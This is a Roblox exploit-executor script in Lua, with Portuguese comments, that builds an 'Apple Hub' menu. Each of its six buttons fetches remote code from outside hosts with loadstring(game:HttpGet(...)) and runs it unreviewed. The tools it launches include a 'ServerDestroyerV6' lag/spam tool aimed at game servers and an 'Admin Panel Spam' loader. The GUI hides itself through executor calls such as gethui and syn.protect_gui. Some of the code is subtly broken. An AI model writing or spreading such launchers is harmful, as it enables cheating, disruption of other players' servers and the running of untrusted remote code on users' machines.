-- Apple Hub - TOTALMENTE RESPONSIVO PARA PC E MOBILE
-- Script com estilo maçã, emojis animados, sombra, arrastável e botões de controle

local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local GuiService = game:GetService("GuiService")

-- Detectar dispositivo automaticamente
local isMobile = UserInputService.TouchEnabled
local isDesktop = UserInputService.MouseEnabled
local screenSize = workspace.CurrentCamera.ViewportSize

-- Configurações responsivas
local DRAG_SPEED = 0.25
local EMOJI_ANIMATION_SPEED = 2

-- Tamanhos responsivos
local MAXIMIZED_SIZE = isMobile and UDim2.new(0.85, 0, 0.75, 0) or UDim2.new(0, 400, 0, 710)
local MINIMIZED_SIZE = isMobile and UDim2.new(0.4, 0, 0, 70) or UDim2.new(0, 200, 0, 60)

-- Dimensões responsivas
local TITLE_HEIGHT = isMobile and 50 or 40
local BUTTON_HEIGHT = isMobile and 65 or 60
local ICON_SIZE = isMobile and 45 or 40
local FONT_TITLE = isMobile and 24 or 20
local FONT_SCRIPTS = isMobile and 26 or 22
local FONT_BUTTON = isMobile and 19 or 18
local FONT_ICON = isMobile and 26 or 24
local PADDING = isMobile and 15 or 10
local SCROLLBAR_SIZE = isMobile and 8 or 5
local CORNER_RADIUS = isMobile and 20 or 15
local BUTTON_CORNER = isMobile and 15 or 10

-- Cria a interface principal
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AppleHub"
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

if gethui then
    ScreenGui.Parent = gethui()
elseif syn and syn.protect_gui then
    syn.protect_gui(ScreenGui)
    ScreenGui.Parent = game:GetService("CoreGui")
else
    ScreenGui.Parent = game:GetService("CoreGui")
end

-- Frame principal (maçã)
local MainFrame = Instance.new("Frame")
MainFrame.Name = "AppleFrame"
MainFrame.Size = MAXIMIZED_SIZE
MainFrame.Position = isMobile and UDim2.new(0.075, 0, 0.125, 0) or UDim2.new(0.5, -200, 0.5, -355)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 59, 48) -- Vermelho maçã
MainFrame.BackgroundTransparency = 0.1
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Active = true
MainFrame.Selectable = true

-- Sombra responsiva
local Shadow = Instance.new("ImageLabel")
Shadow.Name = "Shadow"
Shadow.Size = UDim2.new(1, isMobile and 25 or 20, 1, isMobile and 25 or 20)
Shadow.Position = UDim2.new(0, isMobile and -12.5 or -10, 0, isMobile and -12.5 or -10)
Shadow.BackgroundTransparency = 1
Shadow.Image = "rbxassetid://1316045217"
Shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
Shadow.ImageTransparency = 0.7
Shadow.ScaleType = Enum.ScaleType.Slice
Shadow.SliceCenter = Rect.new(10, 10, 118, 118)
Shadow.ZIndex = 0

-- Título com emoji animado
local TitleFrame = Instance.new("Frame")
TitleFrame.Name = "TitleBar"
TitleFrame.Size = UDim2.new(1, 0, 0, TITLE_HEIGHT)
TitleFrame.BackgroundColor3 = Color3.fromRGB(200, 40, 30)
TitleFrame.BackgroundTransparency = 0.2
TitleFrame.BorderSizePixel = 0
TitleFrame.Active = true

-- Emoji animado
local EmojiLabel = Instance.new("TextLabel")
EmojiLabel.Name = "AppleEmoji"
EmojiLabel.Size = UDim2.new(0, TITLE_HEIGHT, 0, TITLE_HEIGHT)
EmojiLabel.Position = UDim2.new(0, isMobile and 12.5 or 10, 0, 0)
EmojiLabel.BackgroundTransparency = 1
EmojiLabel.Text = "🍎"
EmojiLabel.TextSize = isMobile and 32 or 28
EmojiLabel.Font = Enum.Font.GothamBold
EmojiLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

-- Título
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "Title"
TitleLabel.Size = UDim2.new(1, isMobile and -120 or -100, 1, 0)
TitleLabel.Position = UDim2.new(0, isMobile and 70 or 50, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "Apple Hub " .. (isMobile and "📱" or "🖥️")
TitleLabel.TextSize = FONT_TITLE
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left

-- Botões de controle
local ControlFrame = Instance.new("Frame")
ControlFrame.Name = "Controls"
ControlFrame.Size = UDim2.new(0, isMobile and 100 or 80, 0, TITLE_HEIGHT)
ControlFrame.Position = UDim2.new(1, isMobile and -105 or -90, 0, 0)
ControlFrame.BackgroundTransparency = 1

-- Botão minimizar/maximizar
local ToggleSizeButton = Instance.new("TextButton")
ToggleSizeButton.Name = "ToggleSize"
ToggleSizeButton.Size = UDim2.new(0, isMobile and 35 or 30, 0, isMobile and 35 or 30)
ToggleSizeButton.Position = UDim2.new(0, 5, isMobile and 7.5 or 5, 0)
ToggleSizeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ToggleSizeButton.BackgroundTransparency = 0.8
ToggleSizeButton.Text = "🗖"
ToggleSizeButton.TextSize = isMobile and 20 or 18
ToggleSizeButton.Font = Enum.Font.Gotham
ToggleSizeButton.TextColor3 = Color3.fromRGB(0, 0, 0)
ToggleSizeButton.AutoButtonColor = false
ToggleSizeButton.Active = true
ToggleSizeButton.Selectable = true

-- Botão fechar
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "Close"
CloseButton.Size = UDim2.new(0, isMobile and 35 or 30, 0, isMobile and 35 or 30)
CloseButton.Position = UDim2.new(0, isMobile and 50 or 45, isMobile and 7.5 or 5, 0)
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.BackgroundTransparency = 0.8
CloseButton.Text = "✕"
CloseButton.TextSize = isMobile and 20 or 18
CloseButton.Font = Enum.Font.Gotham
CloseButton.TextColor3 = Color3.fromRGB(0, 0, 0)
CloseButton.AutoButtonColor = false
CloseButton.Active = true
CloseButton.Selectable = true

-- Conteúdo principal
local ContentFrame = Instance.new("Frame")
ContentFrame.Name = "Content"
ContentFrame.Size = UDim2.new(1, -(PADDING * 2), 1, -(TITLE_HEIGHT + PADDING))
ContentFrame.Position = UDim2.new(0, PADDING, 0, TITLE_HEIGHT + (isMobile and 5 or 0))
ContentFrame.BackgroundTransparency = 1

-- Título da seção Scripts
local ScriptsTitle = Instance.new("TextLabel")
ScriptsTitle.Name = "ScriptsTitle"
ScriptsTitle.Size = UDim2.new(1, 0, 0, isMobile and 45 or 40)
ScriptsTitle.BackgroundTransparency = 1
ScriptsTitle.Text = "📜 Scripts"
ScriptsTitle.TextSize = FONT_SCRIPTS
ScriptsTitle.Font = Enum.Font.GothamBold
ScriptsTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
ScriptsTitle.TextXAlignment = Enum.TextXAlignment.Left

-- Container dos scripts
local ScriptsContainer = Instance.new("ScrollingFrame")
ScriptsContainer.Name = "ScriptsContainer"
ScriptsContainer.Size = UDim2.new(1, 0, 1, -(isMobile and 50 or 45))
ScriptsContainer.Position = UDim2.new(0, 0, 0, isMobile and 45 or 40)
ScriptsContainer.BackgroundTransparency = 1
ScriptsContainer.BorderSizePixel = 0
ScriptsContainer.ScrollBarThickness = SCROLLBAR_SIZE
ScriptsContainer.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
ScriptsContainer.CanvasSize = UDim2.new(0, 0, 0, 430)
ScriptsContainer.ScrollingDirection = Enum.ScrollingDirection.Y
ScriptsContainer.VerticalScrollBarInset = Enum.ScrollBarInset.Always

-- Layout dos scripts
local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0, isMobile and 12 or 10)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

-- Função para criar botões responsivos
local function createScriptButton(name, displayName, icon, iconColor, isPremium, isDanger)
    local button = Instance.new("TextButton")
    button.Name = name
    button.Size = UDim2.new(0.95, 0, 0, BUTTON_HEIGHT)
    button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    button.BackgroundTransparency = 0.3
    button.Text = ""
    button.AutoButtonColor = false
    button.BorderSizePixel = 0
    button.Active = true
    button.Selectable = true
    
    local iconLabel = Instance.new("TextLabel")
    iconLabel.Name = "Icon"
    iconLabel.Size = UDim2.new(0, ICON_SIZE, 0, ICON_SIZE)
    iconLabel.Position = UDim2.new(0, isMobile and 10 or 5, 0.5, -ICON_SIZE/2)
    iconLabel.BackgroundTransparency = 1
    iconLabel.Text = icon
    iconLabel.TextSize = FONT_ICON
    iconLabel.Font = Enum.Font.GothamBold
    iconLabel.TextColor3 = iconColor
    iconLabel.Parent = button
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Name = "Label"
    textLabel.Size = UDim2.new(1, -(ICON_SIZE + (isMobile and 15 or 10)), 1, 0)
    textLabel.Position = UDim2.new(0, ICON_SIZE + (isMobile and 12 or 8), 0, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = displayName
    textLabel.TextSize = FONT_BUTTON
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextXAlignment = Enum.TextXAlignment.Left
    textLabel.Parent = button
    
    -- Badge para scripts especiais
    if isPremium or isDanger then
        local badge = Instance.new("TextLabel")
        badge.Name = "Badge"
        badge.Size = UDim2.new(0, isMobile and 30 or 25, 0, isMobile and 30 or 25)
        badge.Position = UDim2.new(1, isMobile and -35 or -30, 0, isMobile and 5 or 5)
        badge.BackgroundColor3 = isPremium and Color3.fromRGB(255, 215, 0) or Color3.fromRGB(178, 34, 34)
        badge.BackgroundTransparency = 0.2
        badge.Text = isPremium and "⚡" or "💀"
        badge.TextSize = isMobile and 16 or 14
        badge.Font = Enum.Font.GothamBold
        badge.TextColor3 = isPremium and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
        badge.Parent = button
        
        local badgeCorner = Instance.new("UICorner")
        badgeCorner.CornerRadius = UDim.new(0, isMobile and 15 or 12)
        badgeCorner.Parent = badge
    end
    
    return button, iconLabel, textLabel
end

-- Criar botões responsivos
local NamelessButton, NamelessIcon, NamelessLabel = createScriptButton(
    "NamelessHub", 
    "Nameless Hub [OP]", 
    "👑", 
    Color3.fromRGB(255, 215, 0),
    false,
    false
)

local ChilliButton, ChilliIcon, ChilliLabel = createScriptButton(
    "ChilliHub", 
    "Chilli Hub [OP]", 
    "🌶️", 
    Color3.fromRGB(255, 69, 58),
    false,
    false
)

local UCTButton, UCTIcon, UCTLabel = createScriptButton(
    "UCTHub", 
    "UCT HUB [OP]", 
    "⚡", 
    Color3.fromRGB(0, 191, 255),
    false,
    false
)

local KurdButton, KurdIcon, KurdLabel = createScriptButton(
    "KurdHub", 
    "Kurd Hub [OP]", 
    "🏔️", 
    Color3.fromRGB(34, 139, 34),
    false,
    false
)

local LagAuraButton, LagAuraIcon, LagAuraLabel = createScriptButton(
    "LagAura", 
    "Lag+Aura [OP]", 
    "💀", 
    Color3.fromRGB(178, 34, 34),
    false,
    true
)

local AdminSpamButton, AdminSpamIcon, AdminSpamLabel = createScriptButton(
    "AdminSpam", 
    "Admin Panel Spam [OP+]", 
    "👑", 
    Color3.fromRGB(255, 215, 0),
    true,
    false
)

-- Montagem da interface
Shadow.Parent = MainFrame
MainFrame.Parent = ScreenGui
TitleFrame.Parent = MainFrame
EmojiLabel.Parent = TitleFrame
TitleLabel.Parent = TitleFrame
ControlFrame.Parent = TitleFrame
ToggleSizeButton.Parent = ControlFrame
CloseButton.Parent = ControlFrame
ContentFrame.Parent = MainFrame
ScriptsTitle.Parent = ContentFrame
ScriptsContainer.Parent = ContentFrame
UIListLayout.Parent = ScriptsContainer

-- Adicionar botões ao container
NamelessButton.Parent = ScriptsContainer
ChilliButton.Parent = ScriptsContainer
UCTButton.Parent = ScriptsContainer
KurdButton.Parent = ScriptsContainer
LagAuraButton.Parent = ScriptsContainer
AdminSpamButton.Parent = ScriptsContainer

-- Variáveis de estado
local isDragging = false
local dragInput, dragStart, startPos
local isMinimized = false
local originalSize = MAXIMIZED_SIZE
local originalPosition = MainFrame.Position
local emojiRotation = 0

-- Sistema de input para mobile e PC
local function getInputPosition(input)
    if input.UserInputType == Enum.UserInputType.Touch then
        return input.Position
    elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
        return input.Position
    end
    return nil
end

-- Função para animar o emoji
local function animateEmoji()
    emojiRotation = (emojiRotation + EMOJI_ANIMATION_SPEED * RunService.RenderStepped:Wait()) % 360
    
    local scale = 1 + math.sin(os.clock() * 3) * 0.1
    EmojiLabel.Rotation = emojiRotation
    EmojiLabel.Size = UDim2.new(0, TITLE_HEIGHT * scale, 0, TITLE_HEIGHT * scale)
    EmojiLabel.Position = UDim2.new(
        0, (isMobile and 12.5 or 10) - (scale - 1) * (TITLE_HEIGHT/2), 
        0, -(scale - 1) * (TITLE_HEIGHT/2)
    )
end

-- Função de clique suave adaptada para mobile
local function animateClick(button)
    local originalSize = button.Size
    local originalTransparency = button.BackgroundTransparency
    
    local tweenIn = TweenService:Create(button, TweenInfo.new(0.1), {
        Size = UDim2.new(
            originalSize.X.Scale, 
            originalSize.X.Offset * (isMobile and 0.92 or 0.95),
            originalSize.Y.Scale, 
            originalSize.Y.Offset * (isMobile and 0.92 or 0.95)
        ),
        BackgroundTransparency = originalTransparency - (isMobile and 0.2 or 0.1)
    })
    
    local tweenOut = TweenService:Create(button, TweenInfo.new(0.1), {
        Size = originalSize,
        BackgroundTransparency = originalTransparency
    })
    
    tweenIn:Play()
    if not isMobile then
        tweenIn.Completed:Wait()
    end
    task.wait(isMobile and 0.08 or 0.05)
    tweenOut:Play()
end

-- Sistema de arrastar para mobile e PC
local function updateDrag(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(
        startPos.X.Scale, 
        startPos.X.Offset + delta.X,
        startPos.Y.Scale, 
        startPos.Y.Offset + delta.Y
    )
end

-- Configurar arrastar para mobile e PC
local function setupDragging(frame)
    local function onInputBegan(input)
        local position = getInputPosition(input)
        if position then
            isDragging = true
            dragStart = position
            startPos = MainFrame.Position
            
            -- Feedback visual para mobile
            if isMobile then
                frame.BackgroundTransparency = 0.1
            end
            
            -- Conectar evento de fim
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    isDragging = false
                    if isMobile then
                        frame.BackgroundTransparency = 0.2
                    end
                end
            end)
        end
    end
    
    -- Configurar para mobile (Touch)
    if isMobile then
        frame.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch then
                onInputBegan(input)
            end
        end)
    end
    
    -- Configurar para PC (Mouse)
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            onInputBegan(input)
        end
    end)
    
    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch or 
           input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)
end

-- Configurar arrastar
setupDragging(TitleFrame)

-- Atualizar posição durante arrasto
UserInputService.InputChanged:Connect(function(input)
    if isDragging and dragInput and input == dragInput then
        updateDrag(input)
    end
end)

-- Sistema de clique/touch para botões
local function setupButtonClick(button, callback)
    -- Para PC
    button.MouseButton1Click:Connect(function()
        animateClick(button)
        callback()
    end)
    
    -- Para Mobile
    if isMobile then
        button.TouchTap:Connect(function()
            animateClick(button)
            callback()
        end)
    end
end

-- Funções dos botões de controle
setupButtonClick(ToggleSizeButton, function()
    if isMinimized then
        -- Maximizar
        MainFrame:TweenSize(MAXIMIZED_SIZE, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true)
        ContentFrame.Visible = true
        ToggleSizeButton.Text = "🗖"
        isMinimized = false
    else
        -- Minimizar
        MainFrame:TweenSize(MINIMIZED_SIZE, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true)
        ContentFrame.Visible = false
        ToggleSizeButton.Text = "🗗"
        isMinimized = true
    end
end)

setupButtonClick(CloseButton, function()
    ScreenGui:Destroy()
end)

-- Função genérica para executar scripts
local function executeScriptFunction(button, icon, label, originalIcon, originalText, scriptFunction)
    setupButtonClick(button, function()
        -- Efeito visual de execução
        icon.Text = "⏳"
        label.Text = isMobile and "Exec..." or "Executando..."
        
        task.wait(0.5)
        
        local success, error = pcall(scriptFunction)
        
        if success then
            icon.Text = "✅"
            label.Text = isMobile and "Sucesso!" or (originalText:gsub("%[OP%+%]", "[EXECUTADO]"))
        else
            icon.Text = "❌"
            label.Text = isMobile and "Erro!" or (originalText:gsub("%[OP%+%]", "[ERRO]"))
            warn("Erro ao executar:", error)
        end
        
        task.wait(1)
        icon.Text = originalIcon
        label.Text = originalText
    end)
end

-- Configurar todos os scripts
executeScriptFunction(NamelessButton, NamelessIcon, NamelessLabel, "👑", "Nameless Hub [OP]", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr"))()
end)

executeScriptFunction(ChilliButton, ChilliIcon, ChilliLabel, "🌶️", "Chilli Hub [OP]", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
end)

executeScriptFunction(UCTButton, UCTIcon, UCTLabel, "⚡", "UCT HUB [OP]", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/UCT-hub/main/refs/heads/main/stealabrainrot"))()
end)

executeScriptFunction(KurdButton, KurdIcon, KurdLabel, "🏔️", "Kurd Hub [OP]", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ninja10908/S4/refs/heads/main/Kurdhub"))()
end)

executeScriptFunction(LagAuraButton, LagAuraIcon, LagAuraLabel, "💀", "Lag+Aura [OP]", function()
    getgenv().ServerDestroyerV6 = {
        Comprar = false,
        Spam = true
    }
    loadstring(game:HttpGet("https://tcscripts.discloud.app/scripts/serverdestroyerv6"))()
end)

executeScriptFunction(AdminSpamButton, AdminSpamIcon, AdminSpamLabel, "👑", "Admin Panel Spam [OP+]", function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fc9523e876bada3b7ed4ebe004cb8cf9.lua"))()
end)

-- Efeitos hover (apenas para PC)
if not isMobile then
    local function setupHoverEffects(button, icon, label, originalIcon)
        button.MouseEnter:Connect(function()
            button.BackgroundTransparency = 0.1
            label.TextColor3 = Color3.fromRGB(255, 215, 0)
            
            if button.Name == "LagAura" then
                local shakeX = math.random(-2, 2)
                local shakeY = math.random(-2, 2)
                icon.Position = UDim2.new(0, 5 + shakeX, 0.5, -20 + shakeY)
            end
            
            if button.Name == "AdminSpam" then
                icon.Text = "✨"
                icon.Rotation = math.sin(os.clock() * 10) * 5
            end
        end)
        
        button.MouseLeave:Connect(function()
            button.BackgroundTransparency = 0.3
            label.TextColor3 = Color3.fromRGB(255, 255, 255)
            
            if button.Name == "LagAura" then
                icon.Position = UDim2.new(0, 5, 0.5, -20)
            end
            
            if button.Name == "AdminSpam" then
                icon.Text = originalIcon
                icon.Rotation = 0
            end
        end)
    end
    
    setupHoverEffects(NamelessButton, NamelessIcon, NamelessLabel, "👑")
    setupHoverEffects(ChilliButton, ChilliIcon, ChilliLabel, "🌶️")
    setupHoverEffects(UCTButton, UCTIcon, UCTLabel, "⚡")
    setupHoverEffects(KurdButton, KurdIcon, KurdLabel, "🏔️")
    setupHoverEffects(LagAuraButton, LagAuraIcon, LagAuraLabel, "💀")
    setupHoverEffects(AdminSpamButton, AdminSpamIcon, AdminSpamLabel, "👑")
end

-- Animação contínua do emoji
RunService.RenderStepped:Connect(animateEmoji)

-- Inicialização
print("🍎 Apple Hub carregado com sucesso!")
print("📱 Dispositivo: " .. (isMobile and "Mobile (Touch)" or "PC (Mouse)"))
print("📏 Tamanho da tela: " .. math.floor(screenSize.X) .. "x" .. math.floor(screenSize.Y))
print("📜 Scripts disponíveis:")
print("1. 👑 Nameless Hub [OP]")
print("2. 🌶️ Chilli Hub [OP]")
print("3. ⚡ UCT HUB [OP]")
print("4. 🏔️ Kurd Hub [OP]")
print("5. 💀 Lag+Aura [OP]")
print("6. 👑 Admin Panel Spam [OP+]")

-- Adiciona borda arredondada
local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, CORNER_RADIUS)
Corner.Parent = MainFrame

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, CORNER_RADIUS)
TitleCorner.Parent = TitleFrame

-- Aplicar cantos arredondados a todos os botões
local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(0, BUTTON_CORNER)

for _, button in pairs({
    NamelessButton, ChilliButton, UCTButton, 
    KurdButton, LagAuraButton, AdminSpamButton,
    ToggleSizeButton, CloseButton
}) do
    local corner = ButtonCorner:Clone()
    corner.Parent = button
end

-- Ajusta o tamanho do canvas dinamicamente
UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    ScriptsContainer.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 20)
end)

-- Efeito de gradiente para os botões (apenas PC)
if not isMobile then
    local function addButtonEffect(button)
        local Gradient = Instance.new("UIGradient")
        Gradient.Color = ColorSequence.new{
            ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 40)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 20))
        }
        Gradient.Rotation = 90
        Gradient.Parent = button
        
        local Stroke = Instance.new("UIStroke")
        Stroke.Color = Color3.fromRGB(100, 100, 100)
        Stroke.Thickness = 1
        Stroke.Transparency = 0.7
        Stroke.Parent = button
    end
    
    for _, button in pairs({
        NamelessButton, ChilliButton, UCTButton, 
        KurdButton, LagAuraButton, AdminSpamButton
    }) do
        addButtonEffect(button)
    end
end

-- Ajustar posição inicial para mobile (evitar sobreposição com controles)
if isMobile then
    task.wait(0.1)
    local safeArea = GuiService:GetGuiInset()
    MainFrame.Position = UDim2.new(
        0.075, 
        safeArea.X,
        0.125, 
        safeArea.Y
    )
end

-- Efeitos especiais para mobile (simulação de feedback tátil)
if isMobile then
    local function addMobileTapEffect(button)
        button.TouchTap:Connect(function()
            -- Simular leve efeito visual de toque
            local originalSize = button.Size
            button.Size = UDim2.new(
                originalSize.X.Scale, 
                originalSize.X.Offset * 0.95,
                originalSize.Y.Scale, 
                originalSize.Y.Offset * 0.95
            )
            
            task.wait(0.08)
            button.Size = originalSize
        end)
    end
    
    for _, button in pairs({
        NamelessButton, ChilliButton, UCTButton, 
        KurdButton, LagAuraButton, AdminSpamButton,
        ToggleSizeButton, CloseButton
    }) do
        addMobileTapEffect(button)
    end
end

-- Ajustar interface quando a tela mudar de tamanho
local function adjustForScreenSize()
    if isMobile then
        local safeArea = GuiService:GetGuiInset()
        local usableHeight = screenSize.Y - safeArea.Y
        
        if not isMinimized then
            MainFrame.Size = UDim2.new(0.85, 0, 0, math.min(usableHeight * 0.75, 700))
        end
        
        -- Reposicionar para evitar bordas
        if MainFrame.Position.Y.Offset + MainFrame.Size.Y.Offset > usableHeight then
            MainFrame.Position = UDim2.new(
                MainFrame.Position.X.Scale,
                MainFrame.Position.X.Offset,
                0.05,
                safeArea.Y
            )
        end
    end
end

-- Ajustar inicialmente
adjustForScreenSize()

-- Ajustar quando a tela for redimensionada
screenSize:GetPropertyChangedSignal("X"):Connect(adjustForScreenSize)
screenSize:GetPropertyChangedSignal("Y"):Connect(adjustForScreenSize)

-- Ajustar tamanho inicial do canvas
task.wait(0.2)
ScriptsContainer.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 20)

-- Aviso responsivo
local warningLabel = Instance.new("TextLabel")
warningLabel.Name = "Warning"
warningLabel.Size = UDim2.new(1, -(PADDING * 2), 0, isMobile and 28 or 25)
warningLabel.Position = UDim2.new(0, PADDING, 1, -(isMobile and 32 or 30))
warningLabel.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
warningLabel.BackgroundTransparency = 0.3
warningLabel.Text = isMobile and "⚠️ Cuidado!" or "⚠️ Cuidado com scripts perigosos!"
warningLabel.TextSize = isMobile and 12 or 11
warningLabel.Font = Enum.Font.GothamBold
warningLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
warningLabel.TextXAlignment = Enum.TextXAlignment.Center
warningLabel.Visible = false
warningLabel.Parent = MainFrame

local warningCorner = Instance.new("UICorner")
warningCorner.CornerRadius = UDim.new(0, isMobile and 10 or 8)
warningCorner.Parent = warningLabel

-- Mostrar aviso quando tocar/hover em scripts perigosos
local function setupWarning(button)
    if isMobile then
        button.TouchTap:Connect(function()
            warningLabel.Visible = true
            task.wait(2)
            warningLabel.Visible = false
        end)
    else
        button.MouseEnter:Connect(function()
            warningLabel.Visible = true
        end)
        
        button.MouseLeave:Connect(function()
            warningLabel.Visible = false
        end)
    end
end

setupWarning(LagAuraButton)
setupWarning(AdminSpamButton)

-- Feedback final
print("✅ Interface Apple Hub totalmente responsiva pronta!")
print("🎯 Modo: " .. (isMobile and "Touch/Tap" or "Click/Hover"))
